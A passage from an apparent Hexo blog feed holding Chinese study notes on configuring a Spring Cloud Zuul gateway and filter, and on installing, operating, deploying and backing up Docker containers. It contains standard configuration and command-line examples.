href="https://github.com/Netflix/zuul%EF%BC%89%EF%BC%9B">https://github.com/Netflix/zuul）；</a></p><p>Zuul 包含了对<strong>请求路由和校验过滤</strong>两个最主要的功能：</p><p>​    其中路由功能负责将外部请求转发到具体的微服务实例上，是实现外部访问统一入口的基础，</p><p>​    客户端请求网关/api/product，通过路由转发到 product </p><p>​    服务客户端请求网关/api/order，通过路由转发到 order 服务</p><p>​    而过滤功能则负责对请求的处理过程进行干预，是实现请求校验等功能的基础.</p><p>Zuul 和 Eureka 进行整合，将 Zuul 自身注册为 Eureka 服务治理中的服务，同时从 Eureka 中获得其他微服务的消息，也即以后的访问微服务都是通过Zuul跳转后获得。</p><p>​    注意：Zuul服务最终还是会注册进Eure</p><h2 id="8-2、搭建路由网关zuul"><a href="#8-2、搭建路由网关zuul" class="headerlink" title="8.2、搭建路由网关zuul"></a>8.2、搭建路由网关zuul</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、引入pom坐标&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;  &lt;!--zuul路由网关依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;/dependencies&gt; <span class="hljs-number">2</span>、application.yml配置文件server:  port: <span class="hljs-number">7001</span>spring:  application:    name: spring-cloud-zuul# 将服务提供者 注册到 Eureka服务注册中心eureka:  client:    registerWithEureka: true # 服务注册开关    fetchRegistry: true # 服务发现开关    serviceUrl: # 客户端(服务提供者)注册到哪一个Eureka Server服务注册中心，多个用逗号分隔      defaultZone: http:<span class="hljs-comment">//eureka6001.com:6001/eureka,http://eureka6002.com:6002/eureka</span>  instance:    instanceId: $&#123;spring.application.name&#125;:$&#123;server.port&#125; # 指定实例ID,就不会显示主机名了    prefer-ip-address: true # 鼠标放到实例ID上后显示 ip地址<span class="hljs-number">3</span>、启动类新增 <span class="hljs-meta">@EnableZuulProxy</span> 注解 开启zuul功能      <span class="hljs-number">4</span>、启动eureka注册中心、启动服务提供者、启动路由网关zuul，检查zuul是否注册到eureka<span class="hljs-number">5</span>、不用路由直接访问  http:<span class="hljs-comment">//localhost:8001/product/get</span><span class="hljs-number">6</span>、使用路由访问 注意端口为zuul端口 http:<span class="hljs-comment">//localhost:7001/spring-cloud-product/product/get/1</span></code></pre><h2 id="8-3、路由转发映射配置"><a href="#8-3、路由转发映射配置" class="headerlink" title="8.3、路由转发映射配置"></a>8.3、路由转发映射配置</h2><pre><code class="hljs xml">1、zuul服务端的application.yml配置文件追加zuul:  routes:    povider-product:           # 路由名称，名称任意，保持所有路由名称唯一      path: /product/**        # 访问路径      serviceId: spring-cloud-product # 指定服务ID，会自动从Eureka中找到此服务的ip和端口  stripPrefix: false   # 代理转发时去掉前缀，false:代理转发时不去掉前缀 例如:为true时请求 /product/get/1，代理转发到/get/1    #如果多个服务需要经过路由，则同povider-product方式一样继续添加即可！2、重启路由zuul服务3、测试zuul路由功能未配置路由转发映射，通过路由请求方式：http://localhost:7001/spring-cloud-product/product/get/1已配置路由转发映射，通过路由请求方式：http://localhost:7001/product/product/get/1product开头的路径，就会转发到spring-cloud-product实例的服务。</code></pre><h2 id="8-4、Zuul-过滤器实战"><a href="#8-4、Zuul-过滤器实战" class="headerlink" title="8.4、Zuul 过滤器实战"></a>8.4、Zuul 过滤器实战</h2><p>Zuul核心就是<strong>过虑器</strong>，通过过虑器实现请求过虑，身份校验等。</p><p>实现步骤：自定义一个过滤器，并注入bean即可。</p><pre><code class="hljs java">自定义过虑器需要继承 ZuulFilter，ZuulFilter是一个抽象类，需要覆盖它的<span class="hljs-number">4</span>个方法，如下：filterType：返回字符串代表过滤器的类型，返回值有：pre：在请求路由之前执行route：在请求路由时调用post：请求路由之后调用， 也就是在route和errror过滤器之后调用error：处理请求发生错误时调用filterOrder：此方法返回整型数值，通过此数值来定义过滤器的执行顺序，数字越小优先级越高。shouldFilter：返回Boolean值，判断该过滤器是否执行。返回<span class="hljs-keyword">true</span>表示要执行此过虑器，<span class="hljs-keyword">false</span>不执行。run：过滤器的业务逻辑。</code></pre><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.netflix.zuul.ZuulFilter;<span class="hljs-keyword">import</span> com.netflix.zuul.context.RequestContext;<span class="hljs-keyword">import</span> com.netflix.zuul.exception.ZuulException;<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 自定义zuul过滤器</span><span class="hljs-comment"> */</span><span class="hljs-meta">@Component</span><span class="hljs-meta">@Slf4j</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ZuulFilter</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">filterType</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">//请求路由前调用</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;pre&quot;</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">filterOrder</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">//int值来定义过滤器的执行顺序，数值越小优先级越高</span>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">shouldFilter</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-comment">//该过滤器是否执行，true执行，false不执行</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ZuulException </span>&#123;        RequestContext context = RequestContext.getCurrentContext();        HttpServletRequest request = context.getRequest();        <span class="hljs-comment">//获取请求参数token的值</span>        String token = request.getParameter(<span class="hljs-string">&quot;token&quot;</span>);        <span class="hljs-keyword">if</span> (token == <span class="hljs-keyword">null</span>) &#123;            log.warn(<span class="hljs-string">&quot;此操作需要先登录系统...&quot;</span>);            context.setSendZuulResponse(<span class="hljs-keyword">false</span>);<span class="hljs-comment">// 拒绝访问</span>            context.setResponseStatusCode(<span class="hljs-number">200</span>);<span class="hljs-comment">// 设置响应状态码</span>            <span class="hljs-keyword">try</span> &#123;                <span class="hljs-comment">//响应结果</span>                context.getResponse().getWriter().write(<span class="hljs-string">&quot;token is empty&quot;</span>);            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                e.printStackTrace();            &#125;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        &#125;        log.info(<span class="hljs-string">&quot;ok&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;    &#125;&#125;</code></pre><pre><code class="hljs java">测试：不带token访问：http:<span class="hljs-comment">//localhost:7001/product/product/get/1</span>带token访问：http:<span class="hljs-comment">//localhost:7001/product/product/get/1?token=123</span>设置多个过滤器时，多个都会执行！</code></pre><h1 id="第九章、Spring-Cloud-Config-分布式配置中心"><a href="#第九章、Spring-Cloud-Config-分布式配置中心" class="headerlink" title="第九章、Spring Cloud Config 分布式配置中心"></a>第九章、Spring Cloud Config 分布式配置中心</h1>]]></content>
    
    
    <categories>
      
      <category>后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringCloud</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker容器</title>
    <link href="/2020/04/21/Docker%E5%85%A5%E9%97%A8/"/>
    <url>/2020/04/21/Docker%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h1><p>最近因为工作需要，利用课余时间通过视频、书籍学习Docker，并在此记录笔记。</p><h1 id="第一章Docker简介"><a href="#第一章Docker简介" class="headerlink" title="第一章Docker简介"></a>第一章Docker简介</h1><h2 id="1-1-Docker能解决什么问题"><a href="#1-1-Docker能解决什么问题" class="headerlink" title="1.1 Docker能解决什么问题"></a>1.1 Docker能解决什么问题</h2><pre><code class="hljs java">问题：开发人员经常说：<span class="hljs-string">&quot;它在我的机器可以正常运行&quot;</span>，言下之意就是，其他机器很可能跑不了解决：开发人员可以使用 Docker 来解决 <span class="hljs-string">&quot;它在我的机器可以正常运行&quot;</span> 的问题，它会将运行程序的相关配置打包（打包成     一个镜像），然后直接搬移到新的机器上运行。</code></pre><h2 id="1-2-什么是虚拟机技术"><a href="#1-2-什么是虚拟机技术" class="headerlink" title="1.2 什么是虚拟机技术"></a>1.2 什么是虚拟机技术</h2><pre><code class="hljs java">概述：它可以在一种操作系统里面运行另一种操作系统，比如 VMware workstation 虚拟化产品提供了虚拟的硬件，在Windows 系统里面运行 Linux 系统。问题：<span class="hljs-number">1</span>、占用资源多,每个虚拟机会独占一部分内存和硬盘空间<span class="hljs-number">2</span>、冗余步骤多,虚拟机是完整的操作系统，一些系统级别的操作步骤，往往无法跳过，比如用户登录。<span class="hljs-number">3</span>、启动慢,启动硬件上的操作系统需要多久，启动虚拟机就需要多久。可能要等几分钟，虚拟机才能真正运行</code></pre><h2 id="1-3-什么是容器"><a href="#1-3-什么是容器" class="headerlink" title="1.3 什么是容器"></a>1.3 什么是容器</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、容器技术由于虚拟机存在的这些缺点，发展处了另一种虚拟化技术：容器容器与虚拟机有所不同：    【虚拟机】通过虚拟软件中间层将一台或者多台独立的虚拟机器运行在物理硬件之上。    (比如使用 VMware workstation 软件生成虚拟机在电脑上)    【容器】则是直接运行在操作系统内核之上。(容器直接安装后就可以运行在电脑上)，是进程级别的，     并对进程进行了隔离，而不是模拟一个完整的操作系统,是轻量级别的</code></pre><p><img src="/images/docker.jpg"></p><p><strong>如上图所示，鲸鱼就是docker，集装箱就是各个容器，海洋就是宿主机，比如Liunx</strong></p><pre><code class="hljs java"><span class="hljs-number">2</span>、容器与虚拟机比较  容器是进程级别的，相比虚拟机有很多优势  容器：体积小、启动快、资源占用少(只占用需要的资源)</code></pre><p><img src="/images/docker%E4%B8%8Evm%E7%9A%84%E5%8C%BA%E5%88%AB.jpeg"></p><h2 id="1-4-Docker内部结构"><a href="#1-4-Docker内部结构" class="headerlink" title="1.4 Docker内部结构"></a>1.4 Docker内部结构</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、Docker镜像(image)镜像是Docker中的一个模板。通过Docker镜像 来创建Docker容器，一个镜像可以创建多个容器。镜像好比一个类，容器则为一个一个的对象。  <span class="hljs-number">2</span>、容器(container)容器是基于镜像创建的运行实例，一个容器中可以运行一个或者多个应用程序。可以理解为，一个精简版的Liunx环境+要运行的应用程序  <span class="hljs-number">3</span>、Docker仓库(repository)仓库是集中存放镜像文件的场所。仓库(Repository)和仓库注册服务器(Registry)有所不同，仓库注册服务器上存放多个仓库，每个仓库又包含了多个镜像，每个镜像有不同的标签(tag)。  Docker仓库分为公有仓库和私有仓库，私有仓库将镜像存入私有服务器即可。</code></pre><h1 id="第二章Docker安装"><a href="#第二章Docker安装" class="headerlink" title="第二章Docker安装"></a>第二章Docker安装</h1><h2 id="2-1、ScentOS安装Docker安装卸载与启停"><a href="#2-1、ScentOS安装Docker安装卸载与启停" class="headerlink" title="2.1、ScentOS安装Docker安装卸载与启停"></a>2.1、ScentOS安装Docker安装卸载与启停</h2><p>安装步骤Docker官网有详细说明 <strong><a href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></strong></p><pre><code class="hljs java"><span class="hljs-number">1</span>、卸载旧版本sudo yum remove docker \                  docker-client \                  docker-client-latest \                  docker-common \                  docker-latest \                  docker-latest-logrotate \                  docker-logrotate \                  docker-engine<span class="hljs-number">2</span>、安装软件包，提供yum-config-manager实用程序sudo yum install -y yum-utils<span class="hljs-number">3</span>、设置镜像sudo yum-config-manager \    --add-repo \    https:<span class="hljs-comment">//download.docker.com/linux/centos/docker-ce.repo</span><span class="hljs-number">4</span>、安装最新的Dockersudo yum install docker-ce docker-ce-cli containerd.io<span class="hljs-number">5</span>、启动Dockersudo systemctl start docker<span class="hljs-number">6</span>、测试Dockersudo docker run hello-world</code></pre><h2 id="2-2、常用指令"><a href="#2-2、常用指令" class="headerlink" title="2.2、常用指令"></a>2.2、常用指令</h2><ul><li>启动Docker：systemctl start docker</li><li>停止docker：systemctl stop docker</li><li>重启docker：systemctl restart docker</li><li>查看docker状态： systemctl status docker</li><li>开机自动启动docker： systemctl enable docker</li><li>Docker帮助指令：docker –help</li></ul><h1 id="第三章、Docker的镜像操作"><a href="#第三章、Docker的镜像操作" class="headerlink" title="第三章、Docker的镜像操作"></a>第三章、Docker的镜像操作</h1><h2 id="3-1、什么是Docker镜像"><a href="#3-1、什么是Docker镜像" class="headerlink" title="3.1、什么是Docker镜像"></a>3.1、什么是Docker镜像</h2><pre><code class="hljs java">docker镜像是由文件系统叠加而成,是一种文件的存储形式。最低端是一个问价引导系统，即bootfs这很像典型的Linux/Unix的引导文件系统。Docker用户几乎永远不会和引导系统有什么交互。实际上，当一个容器启动后，它将会被移动到内存中，而引导文件系统则会被卸载，以留出更多的内存供磁盘镜像使用。Docker容器启动是需要的一些文件，而这些文件就可以称为Docker镜像</code></pre><h2 id="3-2、常用指令"><a href="#3-2、常用指令" class="headerlink" title="3.2、常用指令"></a>3.2、常用指令</h2><ul><li>列出docker下的已安装所有镜像：docker images</li><li>只显示镜像ID：docker images -q</li><li>搜索镜像：docker search[OPTIONS] 镜像名称<pre><code>            OPTIONS: -s 100 列出关注数大于指定值的镜像                     --no-trunc 显示完整的镜像描述</code></pre></li><li>删除镜像：docker rmi 镜像ID             (rmi —— remove images的缩写)</li><li>删除所有镜像：docker rmi <code>docker images -q</code> </li></ul><h2 id="3-3、拉取镜像"><a href="#3-3、拉取镜像" class="headerlink" title="3.3、拉取镜像"></a>3.3、拉取镜像</h2><pre><code class="hljs java">拉取镜像指令：docker pull 镜像名:标签名如果没有 :标签名 则默认下载为最新版本</code></pre><h2 id="3-4、配置国内镜像加速器"><a href="#3-4、配置国内镜像加速器" class="headerlink" title="3.4、配置国内镜像加速器"></a>3.4、配置国内镜像加速器</h2><p>配置阿里云镜像：需要注册一个阿里云账号</p><pre><code class="hljs java">进入阿里云后台，搜索镜像加速器，点击镜像中心——&gt;镜像加速器就可以看到自己的 加速器地址根据操作文档进行操作即可！<span class="hljs-comment">// CentOS为例</span>sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span>&#123;  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://x6w3x27y.mirror.aliyuncs.com&quot;</span>]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><h1 id="第四章、Docker容器操作"><a href="#第四章、Docker容器操作" class="headerlink" title="第四章、Docker容器操作"></a>第四章、Docker容器操作</h1><h2 id="4-1、查看容器"><a href="#4-1、查看容器" class="headerlink" title="4.1、查看容器"></a>4.1、查看容器</h2><pre><code class="hljs java">查询正在运行的容器：docker ps                    CONTAINER ID：容器 ID                    IMAGE ：镜像                    COMMAND：初始命令                    CREATED：创建日期                    STATUS：容器状态                    PORTS：端口号                    NAMES：容器名字查看所有的容器（启动与未启动的容器）：docker ps -a查看最后一次运行的容器：docker ps –l查看停止的容器：docker ps -f status=exited</code></pre><h2 id="4-2、创建容器"><a href="#4-2、创建容器" class="headerlink" title="4.2、创建容器"></a>4.2、创建容器</h2><pre><code class="hljs java">创建容器：docker run [OPTIONS] 镜像名:标签名OPTIONS：-i 表示交互式运行容器（就是创建容器后，马上会启动容器，并进入容器 ），通常与 -t 同时使用 -t 启动后会进入其容器命令行, 通常与 -i 同时使用; 加入 -it 两个参数后，容器创建就能登录进去。     即分配一个伪终端。             --name 为创建的容器指定一个名称。             -d 创建一个守护式容器在后台运行，并返回容器ID。这样创建容器后不会自动登录容器，                如果加 -i 参数，创建后就会运行容器。             -v 表示目录映射, 格式为： -p 宿主机目录:容器目录                注意：最好做目录映射，在宿主机上做修改，然后共享到容器上。             -p 表示端口映射，格式为： -p 宿主机端口:容器端口</code></pre><ul><li>创建交互式容器（创建容器后，马上启动容器，并进入容器）<br>   /bin/bash 是linux中的命令解析器,会进入到容器里面命令行 （也可以省略不写,会自动生成）<br>  指令：docker run -it –name=mycentos centos:7 /bin/bash</li><li>退出容器：exit</li><li>退出但不停止当前容器：Ctrl + p + c</li></ul><h2 id="4-3、启动与停止容器"><a href="#4-3、启动与停止容器" class="headerlink" title="4.3、启动与停止容器"></a>4.3、启动与停止容器</h2><p>如果使用Ctrl + p + c退回当前容器后，不能使用exit退出容器。</p><pre><code class="hljs java"><span class="hljs-number">1</span>、启动已经运行过的容器：docker start 容器名称|容器id<span class="hljs-number">2</span>、启动所有已经运行过的容器：docker start `docker ps -a -q`<span class="hljs-number">3</span>、停止正在运行的容器：docker stop 容器名称|容器id<span class="hljs-number">4</span>、强制停止正在运行的容器：docker kill 容器名称|容器id<span class="hljs-number">5</span>、docker stop `docker ps -a -q`</code></pre><h2 id="4-4、创建守护式容器"><a href="#4-4、创建守护式容器" class="headerlink" title="4.4、创建守护式容器"></a>4.4、创建守护式容器</h2><p>创建一个容器，不需要立即进入容器命令行窗口，而是后台运行的容器。</p><pre><code class="hljs java">创建守护式容器：docker run -id --name=mycentos2 centos:<span class="hljs-number">7</span></code></pre><h2 id="4-5、登录容器"><a href="#4-5、登录容器" class="headerlink" title="4.5、登录容器"></a>4.5、登录容器</h2><pre><code class="hljs java">登录已经启动的容器方：docker exec -it 容器名称|容器id /bin/bash</code></pre><h2 id="4-6、退出守护式容器"><a href="#4-6、退出守护式容器" class="headerlink" title="4.6、退出守护式容器"></a>4.6、退出守护式容器</h2><pre><code class="hljs java">exit 针对通过 docker exec 进入的容器，只退出但不停止容器</code></pre><h2 id="4-7、拷贝宿主机与容器的文件"><a href="#4-7、拷贝宿主机与容器的文件" class="headerlink" title="4.7、拷贝宿主机与容器的文件"></a>4.7、拷贝宿主机与容器的文件</h2><pre><code class="hljs java">将宿主机文件拷贝到容器内：docker cp 要拷贝的宿主机文件或目录 容器名称:容器文件或目录从容器内文件拷贝到宿主机：docker cp 容器名称:要拷贝的容器文件或目录 宿主机文件或目录【所有操作都是在宿主机上执行，容器内不可执行！】  例如：docker cp /daemon.json <span class="hljs-number">298</span>c83a3db6a:/     docker cp  <span class="hljs-number">298</span>c83a3db6a:/daemon.json /</code></pre><h2 id="4-8、数据目录挂载"><a href="#4-8、数据目录挂载" class="headerlink" title="4.8、数据目录挂载"></a>4.8、数据目录挂载</h2><p><strong>我们可以在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样我们就可以通过修改宿主机某</strong><br><strong>个目录的文件从而去影响容器。使用 -v 选项</strong></p><pre><code class="hljs java">docker run -id -v /宿主机绝对路径目录:/容器内目录 --name=容器名 镜像名</code></pre><h2 id="4-9、数据目录挂载只读-Read-Only-权限"><a href="#4-9、数据目录挂载只读-Read-Only-权限" class="headerlink" title="4.9、数据目录挂载只读(Read-Only)权限"></a>4.9、数据目录挂载只读(Read-Only)权限</h2><pre><code class="hljs java">docker run -id -v /宿主机绝对路径目录:/容器内目录:ro --name=容器名 镜像名</code></pre><h2 id="4-10、查看容器内部细节"><a href="#4-10、查看容器内部细节" class="headerlink" title="4.10、查看容器内部细节"></a>4.10、查看容器内部细节</h2><pre><code class="hljs java">docker inspect 容器名|容器ID</code></pre><p>docker inspect 命令查询的结果为JSON格式，也可以查询指定内容，比如<strong>查询容器IP地址</strong></p><pre><code class="hljs java">docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&#x27;</span> 容器名</code></pre><h2 id="4-11、删除容器"><a href="#4-11、删除容器" class="headerlink" title="4.11、删除容器"></a>4.11、删除容器</h2><p><strong>只能删除停止的容器</strong></p><pre><code class="hljs java">只能删除停止的容器 ： docker rm 容器名称 | 容器ID删除所有容器：docker rm `docker ps -a -q`</code></pre><h1 id="第五-章实战部署应用"><a href="#第五-章实战部署应用" class="headerlink" title="第五 章实战部署应用"></a>第五 章实战部署应用</h1><h2 id="5-1、MySQL部署"><a href="#5-1、MySQL部署" class="headerlink" title="5.1、MySQL部署"></a>5.1、MySQL部署</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、拉取mysql镜像：docker pull mysql:<span class="hljs-number">5.7</span>  <span class="hljs-number">2</span>、创建mysql镜像：docker run -id --name=docker_mysql -p <span class="hljs-number">33306</span>:<span class="hljs-number">3306</span> -e MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span> mysql:<span class="hljs-number">5.7</span>   -p 代表端口映射，格式为 宿主机映射端口:容器运行端口   -e 代表添加环境变量， MYSQL_ROOT_PASSWORD 是 root 用户的登陆密码     <span class="hljs-number">3</span>、进入MySQL容器，登录MySQLdocker exec -it docker_mysql /bin/bash<span class="hljs-number">4</span>、远程连接mysql:使用宿主机的IP地址+宿主机映射端口(第二步)<span class="hljs-number">5</span>、连接超时原因：      如连接不上，则查看宿主机防火墙有没关闭或者是上面暴露端口号配置是否正确      查看状态： systemctl status firewalld      关闭： systemctl stop firewalld      开机禁用： systemctl disable firewalld            查看阿里云服务器是否配置防火墙</code></pre><h2 id="5-2、Redis部署"><a href="#5-2、Redis部署" class="headerlink" title="5.2、Redis部署"></a>5.2、Redis部署</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、拉取redis镜像docker pull redis<span class="hljs-number">2</span>、创建redis容器docker run -id --name=docker_redis -p <span class="hljs-number">6379</span>:<span class="hljs-number">6379</span> redis</code></pre><h2 id="5-3、Tomcat部署"><a href="#5-3、Tomcat部署" class="headerlink" title="5.3、Tomcat部署"></a>5.3、Tomcat部署</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、拉取镜像docker pull tomcat<span class="hljs-number">2</span>、创建tomcat容器docker run -id --name=docker_tomcat -p <span class="hljs-number">8181</span>:<span class="hljs-number">8080</span> -v /usr/local/project:/usr/local/tomcat/webapps --privileged=<span class="hljs-keyword">true</span> tomcat  -p 表示地址映射, 宿主机端口号:容器运行端口号-v 表示地址映射, 宿主机目录:容器映射目录--privileged=<span class="hljs-keyword">true</span> 如果映射的是多级目录，防止有可能会出现没有权限的问题，所以加上此参数<span class="hljs-number">3</span>、测试目录挂载  在宿主机/usr/local/project下创建test/mumu.jpg图片文件  登录docker：docker exec -it docker_tomcat /bin/bash  查看webapps下是否有新增文件  浏览器打开: ip地址:<span class="hljs-number">8181</span>/test/mumu.jpg</code></pre><h2 id="5-4、创建RabbitMQ容器"><a href="#5-4、创建RabbitMQ容器" class="headerlink" title="5.4、创建RabbitMQ容器"></a>5.4、创建RabbitMQ容器</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、拉取镜像(有管理页面)docker pull rabbitmq:management<span class="hljs-number">2</span>、创建镜像:  方式一：创建镜像（默认用户名密码）,远程连接端口<span class="hljs-number">5672</span>，管理系统访问端口<span class="hljs-number">15672</span>，默认账号密码:guest  docker run -id --name=docker_rabbitmq -p <span class="hljs-number">5672</span>:<span class="hljs-number">5672</span> -p <span class="hljs-number">15672</span>:<span class="hljs-number">15672</span> rabbitmq:management    方式二：启动镜像（设置用户名密码）  docker run -id --name=docker_rabbitmq -e RABBITMQ_DEFAULT_USER=username -e  RABBITMQ_DEFAULT_PASS=password -p <span class="hljs-number">5672</span>:<span class="hljs-number">5672</span> -p <span class="hljs-number">15672</span>:<span class="hljs-number">15672</span> rabbitmq:management</code></pre><h2 id="部署常见问题"><a href="#部署常见问题" class="headerlink" title="部署常见问题"></a>部署常见问题</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、docker端口映射或启动容器时报错Error response from daemon: driver failed programming external connectivity on end解决方案：docker服务启动时定义的自定义链DOCKER由于某种原因被清掉，重启docker服务及可重新生成自定义链DOCKERsystemctl restart docker</code></pre><h1 id="第六章-备份与迁移"><a href="#第六章-备份与迁移" class="headerlink" title="第六章 备份与迁移"></a>第六章 备份与迁移</h1><h2 id="6-1、-容器保存为镜像"><a href="#6-1、-容器保存为镜像" class="headerlink" title="6.1、 容器保存为镜像"></a>6.1、 容器保存为镜像</h2><p>将我们创建的容器保存为镜像后，数据迁移时就可以直接下载镜像，不需要再重新进行下载、配置容器。</p><pre><code class="hljs java">通过以下命令将容器保存为镜像:    docker commit [-m=<span class="hljs-string">&quot;提交的描述信息&quot;</span>] [-a=<span class="hljs-string">&quot;创建者&quot;</span>] 容器名称|容器ID 生成的镜像名[:标签名]</code></pre><h2 id="6-1-1、无目录挂载-容器保存为镜像"><a href="#6-1-1、无目录挂载-容器保存为镜像" class="headerlink" title="6.1.1、无目录挂载-容器保存为镜像"></a>6.1.1、无目录挂载-容器保存为镜像</h2><pre><code class="hljs java">查询是否有挂载目录 docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.Mounts&#125;&#125;&#x27;</span>容器名 docker commit [-m=<span class="hljs-string">&quot;提交的描述信息&quot;</span>] [-a=<span class="hljs-string">&quot;创建者&quot;</span>] 容器名称|容器ID 生成的镜像名[:标签名]</code></pre><h2 id="6-1-2、有目录挂载情况"><a href="#6-1-2、有目录挂载情况" class="headerlink" title="6.1.2、有目录挂载情况"></a>6.1.2、有目录挂载情况</h2><p><strong>问题</strong>：</p><pre><code class="hljs java">如果Docker对容器挂载了数据目录, 在将容器保存为镜像时，数据不会被保存到镜像中</code></pre><p><strong>原因</strong>：</p><pre><code class="hljs java">因为宿主机与容器做了路径映射，再commit一个新的镜像时，该路径下的所有数据都会被抛弃，不会被保存到新镜像中。可通过 docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.Mounts&#125;&#125;&#x27;</span> 镜像名查看是否有目录挂载</code></pre><p><strong>解决</strong>：</p><pre><code class="hljs java">目录挂载方法：先把在宿主机的数据备份在某个目录下，在 docker run 的时候使用-v参数将宿主机上的目录映射到容器里的目标路径中（tomcat是 /usr/local/tomcat/webapps ，mysql是 <span class="hljs-keyword">var</span>/lib/mysql ）  拷贝方法：     先把在宿主机的数据备份在某个目录下，通过拷贝的方法 docker cp 将备份的数据复制进容器里的目标路径中（tomcat是 /usr/local/tomcat/webapps ，mysql是 <span class="hljs-keyword">var</span>/lib/mysql ）。</code></pre><ul><li>第一步，将需要备份的数据保存到宿主机上</li><li>第二步，将容器保存为镜像</li><li>第三步，下载镜像</li><li>第四步，恢复数据，备份数据量如果大，就采用拷贝方法(先启动容器后拷贝,比如mysql)，如果备份量小的话，就可以采用目录挂载(启动容器的时候就数据同步,比如tomcat)</li></ul><pre><code class="hljs java">tomcat案例：查询数据保存的位置：docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.Mounts&#125;&#125;&#x27;</span> docker_tomcat  将宿主机数据进行备份：cp -rf /usr/local/project/ /usr/local/baseproject  保存容器为镜像：docker commit docker_tomcat tomcat_new:<span class="hljs-number">1</span>  采用目录挂载创建容器：docker run -id --name=tomcat_new_test -p <span class="hljs-number">8081</span>:<span class="hljs-number">8080</span> -v \/usr/local/baseproject:/usr/local/tomcat/webapps --privileged=<span class="hljs-keyword">true</span> tomcat_new:<span class="hljs-number">1</span></code></pre><pre><code class="hljs java">mysql案例：mysql容器创建时，会自动实现目录挂载，查询看docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.Mounts&#125;&#125;&#x27;</span> docker_mysql  将宿主机的目录进行备份： cp -rf /<span class="hljs-keyword">var</span>/lib/docker<span class="hljs-comment">/****/</span> /usr/local/baseproject  保存容器为镜像：docker commit docker_mysql mysql_new:<span class="hljs-number">1</span>  利用保存的容器创建容器：docker run -id --name=docker_mysql_new -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> -e MYSQL_ROOT_PASSWORD=<span class="hljs-number">123456</span> mysql_new:<span class="hljs-number">1</span>  利用拷贝方法进行数据还原，容器中的数据目录为：/<span class="hljs-keyword">var</span>/lib/mysql  docker cp /mysql/ docker_mysql_new:/<span class="hljs-keyword">var</span>/lib/  重启mysql容器：docker restart docker_mysql_new</code></pre><h2 id="6-2、-备份镜像"><a href="#6-2、-备份镜像" class="headerlink" title="6.2、 备份镜像"></a>6.2、 备份镜像</h2><p>问题：如何将自己的镜像发给别人使用？</p><pre><code class="hljs java">docker save -o /opt/mycentos.tar mycentos_new:<span class="hljs-number">1.1</span>-o 指定输出到的文件</code></pre><h2 id="6-3、镜像恢复与迁移"><a href="#6-3、镜像恢复与迁移" class="headerlink" title="6.3、镜像恢复与迁移"></a>6.3、镜像恢复与迁移</h2><p>将别人打包好的镜像，解压</p><pre><code class="hljs java">docker load -i mycentos.tar-i输入的镜像文件</code></pre><h1 id="第七章、Dockerfile语法与实战"><a href="#第七章、Dockerfile语法与实战" class="headerlink" 